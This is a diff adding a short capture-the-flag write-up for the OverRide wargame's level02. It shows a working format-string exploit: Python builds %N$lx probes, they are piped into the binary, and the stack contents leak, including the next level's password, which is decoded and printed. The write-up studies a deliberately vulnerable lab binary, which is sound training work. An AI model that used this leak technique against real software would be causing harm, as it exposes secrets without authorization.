@@ -1,0 +1,54 @@
+we can see that if the password is wrong it prints the username directly
+so we can print stuff:
+
+>>> for i in range(1, 10):
+...     print(f'%{i}$lx__', end='')
+...
+%1$lx__%2$lx__%3$lx__%4$lx__%5$lx__%6$lx__%7$lx__%8$lx__%9$lx__
+>>> for i in range(10, 20):
+...     print(f'%{i}$lx__', end='')
+...
+%10$lx__%11$lx__%12$lx__%13$lx__%14$lx__%15$lx__%16$lx__%17$lx__%18$lx__%19$lx__
+>>> for i in range(20, 30):
+...     print(f'%{i}$lx__', end='')
+...
+%20$lx__%21$lx__%22$lx__%23$lx__%24$lx__%25$lx__%26$lx__%27$lx__%28$lx__%29$lx__
+
+
+place them in to files and launch them:
+
+level02@OverRide:~$ cat /tmp/exp | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+7fffffffe4f0__0__0__2a2a2a2a2a2a2a2a__2a2a2a2a2a2a2a2a__7fffffffe6e8__1f7ff9a08__0__0__ does not have access!
+
+
+level02@OverRide:~$ cat /tmp/exp | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0__0__0__0__0__0__0__0__0__0__ does not have access!
+
+
+level02@OverRide:~$ cat /tmp/exp | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+100000000__0__756e505234376848__45414a3561733951__377a7143574e6758__354a35686e475873__48336750664b394d__0__5f5f786c24303225__5f5f786c24313225__ does not have access!
+
+
+in the third output we see something that can be a password from the thid ot the seventh:
+
+>>> passwd = '756e505234376848__45414a3561733951__377a7143574e6758__354a35686e475873__48336750664b394d'
+>>> passwd = passwd.replace('__', '0a')
+>>> ''.join([p[::-1] for p in bytes.fromhex(passwd).decode().split('\n')])
+'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
